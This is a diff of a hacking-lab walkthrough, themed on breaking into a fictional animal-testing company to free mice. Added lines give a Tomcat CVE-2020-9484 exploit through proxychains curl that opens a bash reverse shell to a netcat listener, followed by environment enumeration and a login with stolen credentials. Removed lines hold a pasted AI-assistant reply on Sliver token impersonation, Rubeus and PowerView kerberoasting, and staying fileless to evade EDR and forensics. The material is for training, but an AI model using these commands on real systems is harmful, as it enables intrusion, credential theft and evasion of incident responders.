@@ -28,10 +28,9 @@
     - [Getting and cracking the hashes of the privileged service account](#getting-and-cracking-the-hashes-of-the-privileged-service-account)
     - [Golden Tickets](#golden-tickets)
   - [Pivoting to the Internal Kubernetes Infrastructure](#pivoting-to-the-internal-kubernetes-infrastructure)
-    - [Exploiting the vulnerable server](#exploiting-the-vulnerable-server)
+    - [Exploiting the vulnerable TOMCAT server](#exploiting-the-vulnerable-tomcat-server)
+  - [What about the mice we want to set free?](#what-about-the-mice-we-want-to-set-free)
   - [Lab Conclusion](#lab-conclusion)
-  - [Lab TODOs](#lab-todos)
-- [Executed entirely in-memory via a C2 PowerShell channel](#executed-entirely-in-memory-via-a-c2-powershell-channel)
 
 ## Welcome!
 
@@ -636,61 +635,81 @@ proxychains smbclient //dc01.crueltesting.com/DomainAdminSecret -k -c 'ls'
 
 With the Active Directory infrastructure completely compromised, we now turn our efforts to the OT environment of Cruel Testing.
 
-We learned from DNS and from the documentes on garfields computer that there is a system "tomcat" that has a vulnerability.
+We learned from DNS and from the documents on garfields computer that there is a system "tomcat" that has a vulnerability. We also learned about "m2" for mice management that seems really interesting.
 
-See if we can reach tomcat via our proxy relay
+### Exploiting the vulnerable TOMCAT server
 
-open firefox with proxy and check if you can  go to tomcat.crueltesting.com
+See if we can reach tomcat.crueltesting.com via our proxy relay
 
-### Exploiting the vulnerable server
+From the shell window on evil type
+
+```
+proxychains nc -v -w 3 tomcat.crueltesting.com 80
+```
+
+![Try netcat to reach tomcat.crueltesting.com](assets/nc-to-tomcat.png)
+**We can reach tomcat.crueltesting.com
+
+We could now use a scanner to find vulnerabilities. But since we already learned from Garfield's TODO files which the vulnerability is (CVE-2020-9484) , so we could search the internet (or ask AI) for the suitable exploit (provided below free of charge)
+
+On a shell tab execute a netcat listener that listens to incoming connections.
+
+```
+nc -nlvp 6666
+```
+![netcat listening on port 6666](assets/nc-listening.png)
+**Netcat listening on port 6666
+
+On a different shell tab, paste the exploit
+```
+proxychains curl "http://tomcat.crueltesting.com/tomcat_10_and_upper-1.3.0/api.jsp?action=exec&cmd=bash%20-i%20%3E%26%20/dev/tcp/10.0.1.6/6666%200%3E%261"
+```
+![Tomcat Exploit](assets/tomcat-exploit.png
+**Tomcat exploit
+
+On the other shell tab, where we started the netcat listener we should now see the incoming connection.
+
+![netcat incoming connection](assets/nc-incoming-connection.png)
+
+The '#' sign for the prompt is very promising. Seems we are inside a linux system and we are root, we have already the highest privileges.
+
+Let's check our environment (in the shell with the netcat listener)
+
+```
+env
+```
+![tomcat environment](assets/env.png)
+**Tomcat Environment
+
+We can see that the application is running in a kubernetes cluster. By default, we then have access to any other application in the kubernetes cluster.
+
+"Hacking Cloud Applications" is a separate lab by FelineCyber where you will learn attacking cloud environments such as Kubernetes, but also Azure, AWS environments.
+
+
+## What about the mice we want to set free?
+
+Never forget Our mission! Our mission was to set our buddies (rats) free!
+
+We know from previous exercises the url, username and password of the Mice Management System used to cruelly torture our friends (rats).
+
+From a firefox browser using the outgoing proxy, access m2.labrats.se.This is the management system for Cruel Testing animal research, here the cruel operators can watch the mice via cameras, feed them with probably dangerous substances, watch their weights going up and down... and more
+
+On evil, open up firefox with proxy settings (remember that we cannot reach m2.crueltesting directly but have to go via proxy)
+
+But you can login with the stolen credentials garfield/Lasagna.
+
+Then you can free your mice!! At least the ones you own.
+
+
+
+
 
 ## Lab Conclusion
 
+We hope this lab has shown you the motivation, mindset, tools, techniques of the intruders.
 
-## Lab TODOs
 
-Ah, my apologies! You are completely right—JOYOUS_MORTGAGE is your active session name, but the command name in Sliver isn't tokens.
 
-Sliver uses the impersonate command (instead of Metasploit-style tokens) to find and steal a logged-in user's token.
 
-Here is how you do it directly inside your JOYOUS_MORTGAGE session:
 
-Impersonate Garfield directly by username:
 
-Plaintext
-impersonate garfield
-Run your installed Rubeus alias to Kerberoast:
-
-Plaintext
-rubeus kerberoast /outfile:hashes.kerberoast
-Revert back to SYSTEM when you're done:
-
-Plaintext
-rev2self
-You are 100% right. In a real-world engagement against a hardened environment with modern EDR and monitoring, dropping files like hashes.kerberoast directly onto the target's disk is a textbook OpSec (Operational Security) failure.
-
-Even if you have real-time Defender or an EDR temporarily blinded, file-creation telemetry (MFT records, USN journal entries, and file-write hooks) leaves permanent forensic artifacts that incident responders and threat hunters will spot immediately.
-
-Real attackers avoid touching the disk entirely through several techniques:
-
-1. Ditch the /outfile: Flag (Stream to Stdout)
-Rubeus doesn't actually need to write to a file. If you run rubeus kerberoast without the /outfile: argument, it prints the entire table of hashes directly to standard output (stdout):
-
-Plaintext
-rubeus kerberoast
-Because Sliver captures stdout and streams it back through your C2 channel in memory, the hashes appear right in your operator console window. Zero bytes are written to the target's disk. You can simply copy and paste the hash straight from your terminal into a local file on your Ubuntu machine.
-
-2. Fileless Execution via PowerShell (Invoke-Kerberoast)
-If you want to stay completely away from compiled C# binaries (.NET assemblies), you can use built-in memory-only PowerShell scripts:
-
-PowerShell
-# Executed entirely in-memory via a C2 PowerShell channel
-Import-Module .\PowerView.ps1
-Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash
-This queries the directory and outputs the hash strings directly to the console stream without dropping tools or output files.
-
-3. Living off the Land (LotL)
-Advanced threat actors lean heavily on native Windows binaries (like setspn.exe or nltest) or native .NET classes (System.IdentityModel.Tokens.KerberosRequestorSecurityToken) to request tickets without introducing external offensive tooling at all.
-
-The Lab vs. Reality Tradeoff
-In a classroom or training lab, dropping files makes debugging and grading easy because students can visually verify artifacts. But in an operational assessment, forcing your tools to operate strictly in-memory and streaming stdout is the gold standard for staying under the radar.
